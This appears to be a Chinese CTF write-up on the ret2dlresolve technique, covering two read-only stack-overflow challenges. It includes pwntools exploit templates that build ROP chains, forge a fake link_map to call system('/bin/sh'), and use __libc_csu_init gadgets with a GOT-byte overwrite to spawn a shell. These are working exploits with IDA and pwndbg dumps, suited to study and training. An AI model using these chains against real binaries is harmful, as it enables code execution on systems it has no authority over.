# ret2dlresolve

‍

## 示例题目1

- 程序只有 read ，没有任何其他输出的函数，所以就没法泄露

```python
ssize_t next()
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF
  return read(0, buf, 0x200uLL);
}
```

- EXP 模板

```python
    libc = ELF('libc.so')
    elf = ELF('binary')
    pop_rdi =0x0000000000401683 # pop rdi ; ret
    pop_rsi =0x0000000000401681 # pop rsi ; pop r15 ; ret
    bss_stage=  0x404800

    plt_load = 0x401026
    # .plt:0000000000401020                               ; ==========================
    # .plt:0000000000401020
    # .plt:0000000000401020                               ; Segment type: Pure code
    # .plt:0000000000401020                               ; Segment permissions: Read/Execute
    # .plt:0000000000401020                               _plt segment para public 'CODE' use64
    # .plt:0000000000401020                               assume cs:_plt
    # .plt:0000000000401020                               ;org 401020h
    # .plt:0000000000401020                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
    # .plt:0000000000401020
    # .plt:0000000000401020                               ; =============== S U B R O U T I N E ========
    # .plt:0000000000401020
    # .plt:0000000000401020
    # .plt:0000000000401020                               sub_401020 proc near                    ; CODE XREF: sub_401030+9↓j
    # .plt:0000000000401020                                                                       ; sub_401040+9↓j
    # .plt:0000000000401020                                                                       ; sub_401050+9↓j
    # .plt:0000000000401020                                                                       ; sub_401060+9↓j
    # .plt:0000000000401020                               ; __unwind {
    # .plt:0000000000401020 FF 35 E2 2F 00 00             push    cs:qword_404008
    # .plt:0000000000401026 F2 FF 25 E3 2F 00 00          bnd jmp cs:qword_404010
    # .plt:0000000000401026
    # .plt:0000000000401026                               sub_401020 endp

    payload = flat( 'a' * 0x38 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , elf.plt['read'] , # 把link_map写到bss段上
                pop_rsi , 0 ,0 , # 使栈十六字节对齐，不然调用不了system
                pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引
)
    pay = payload
    sl(pay)
    io.interactive()
    def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
        # &(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误
        linkmap = p64(offset & (2 ** 64 - 1))#l_addr

        # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容
        linkmap += p64(0) # 可以为任意值
        linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址

        # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
        linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)) # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 
        linkmap += p64(0x7) # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
        linkmap += p64(0)# Rela->r_addend,任意值都行

        linkmap += p64(0)#l_ns

        # fake_linkmap_addr + 0x38, DT_SYMTAB 
        linkmap += p64(0) # 参考IDA上.dyamisc的结构
        linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8

        linkmap += b'/bin/sh\x00'
        linkmap = linkmap.ljust(0x68,b'A')
        linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
        linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
        linkmap = linkmap.ljust(0xf8,b'A')
        linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
        return linkmap
    l_addr =  libc.sym['system'] -libc.sym['setvbuf']  # l_addr = -769472, 通常为负数
    fake_link_map = fake_Linkmap_payload(bss_stage, elf.got['setvbuf'] ,l_addr)
    sl(fake_link_map)
    sl('id')
    pass
```

‍

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
pop_rdi = 0x0000000000400743 # pop rdi ; ret
pop_rsi = 0x0000000000400741 # pop rsi ; pop r15 ; ret
bss_stage=  0x601800

plt_load = 0x400516
# .plt:0000000000401020                               ; ==========================
# .plt:0000000000401020
# .plt:0000000000401020                               ; Segment type: Pure code
# .plt:0000000000401020                               ; Segment permissions: Read/Execute
# .plt:0000000000401020                               _plt segment para public 'CODE' use64
# .plt:0000000000401020                               assume cs:_plt
# .plt:0000000000401020                               ;org 401020h
# .plt:0000000000401020                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
# .plt:0000000000401020
# .plt:0000000000401020                               ; =============== S U B R O U T I N E ========
# .plt:0000000000401020
# .plt:0000000000401020
# .plt:0000000000401020                               sub_401020 proc near                    ; CODE XREF: sub_401030+9↓j
# .plt:0000000000401020                                                                       ; sub_401040+9↓j
# .plt:0000000000401020                                                                       ; sub_401050+9↓j
# .plt:0000000000401020                                                                       ; sub_401060+9↓j
# .plt:0000000000401020                               ; __unwind {
# .plt:0000000000401020 FF 35 E2 2F 00 00             push    cs:qword_404008
# .plt:0000000000401026 F2 FF 25 E3 2F 00 00          bnd jmp cs:qword_404010
# .plt:0000000000401026
# .plt:0000000000401026                               sub_401020 endp

payload = flat( 'a' * 0x048 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , elf.plt['read'] , # 把link_map写到bss段上
            pop_rsi , 0 ,0 , # 使栈十六字节对齐，不然调用不了system
            pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引
)
pay = payload
gdb.attach(io)
sl(pay)
io.interactive()

def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    # &(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误
    linkmap = p64(offset & (2 ** 64 - 1))#l_addr

    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容
    linkmap += p64(0) # 可以为任意值
    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址

    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)) # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 
    linkmap += p64(0x7) # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
    linkmap += p64(0)# Rela->r_addend,任意值都行

    linkmap += p64(0)#l_ns

    # fake_linkmap_addr + 0x38, DT_SYMTAB 
    linkmap += p64(0) # 参考IDA上.dyamisc的结构
    linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8

    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68,b'A')
    linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
    linkmap = linkmap.ljust(0xf8,b'A')
    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
    return linkmap
l_addr =  libc.sym['system'] -libc.sym['setvbuf']  # l_addr = -769472, 通常为负数
fake_link_map = fake_Linkmap_payload(bss_stage, elf.got['setvbuf'] ,l_addr)
sl(fake_link_map)
#sl('id')
```

‍

‍

‍

## 示例题目2 (csu)

- 程序只有 read ，没有任何其他输出的函数，所以就没法泄露

- 9-nothing_to_do

‍

```python
ssize_t next()
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF
  return read(0, buf, 0x200uLL);
}
```

```python
pwndbg> vp
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x3ff000           0x400000 rw-p     1000      0 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
          0x400000           0x401000 r--p     1000   1000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
          0x401000           0x402000 r-xp     1000   2000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
          0x402000           0x403000 r--p     1000   3000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
          0x403000           0x404000 r--p     1000   3000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
          0x404000           0x405000 rw-p     1000   4000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
```

- 可以直接getshell

```python
read_plt = elf.plt['read']
read_got = elf.got['read']

pop_rdi = 0x0000000000401683
pop_rsi = 0x0000000000401681
# # ROPgadget --binary pwn --only 'pop|ret'
# Gadgets information
# ============================================================
# 0x0000000000401683 : pop rdi ; ret
# 0x0000000000401681 : pop rsi ; pop r15 ; ret

csu1 = 0x000000000040167A
csu2 = 0x0000000000401660
# .text:0000000000401660 4C 89 F2                      mov     rdx, r14 <----- csu2
# .text:0000000000401663 4C 89 EE                      mov     rsi, r13
# .text:0000000000401666 44 89 E7                      mov     edi, r12d
# .text:0000000000401669 41 FF 14 DF                   call    ds:(__frame_dummy_init_array_entry - 403E08h)[r15+rbx*8]
# .text:0000000000401669
# .text:000000000040166D 48 83 C3 01                   add     rbx, 1
# .text:0000000000401671 48 39 DD                      cmp     rbp, rbx
# .text:0000000000401674 75 EA                         jnz     short loc_401660
# .text:0000000000401674
# .text:0000000000401676
# .text:0000000000401676                               loc_401676:                             ; CODE XREF: __libc_csu_init+35↑j
# .text:0000000000401676 48 83 C4 08                   add     rsp, 8
# .text:000000000040167A 5B                            pop     rbx <----- csu1
# .text:000000000040167B 5D                            pop     rbp
# .text:000000000040167C 41 5C                         pop     r12
# .text:000000000040167E 41 5D                         pop     r13
# .text:0000000000401680 41 5E                         pop     r14
# .text:0000000000401682 41 5F                         pop     r15
# .text:0000000000401684 C3                            retn

write_ok = 0x404100 # 可写
# pwndbg> vp
# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
#              Start                End Perm     Size Offset File
#           0x3ff000           0x400000 rw-p     1000      0 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
#           0x400000           0x401000 r--p     1000   1000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
#           0x401000           0x402000 r-xp     1000   2000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
#           0x402000           0x403000 r--p     1000   3000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
#           0x403000           0x404000 r--p     1000   3000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn
#           0x404000           0x405000 rw-p     1000   4000 /mnt/hgfs/Downloads/nkctf/NK_PWN/only_read/pwn

payload = b'a'*0x38 + p64(pop_rsi) + p64(write_ok)*2 + p64(read_plt)
payload += p64(pop_rsi) + p64(read_got)*2 + p64(read_plt)
payload += p64(csu1) + p64(0) + p64(1) + p64(1) + p64(read_got) + p64(0x3b) + p64(read_got) + p64(csu2)
payload += p64(csu1) + p64(0) + p64(1) + p64(write_ok) + p64(0) + p64(0) + p64(read_got) + p64(csu2)
p.send(payload)
p.sendline(b'/bin/sh\x00')
p.send(p8(0xd0))
p.interactive()
```

‍

‍

‍

## 参考

‍
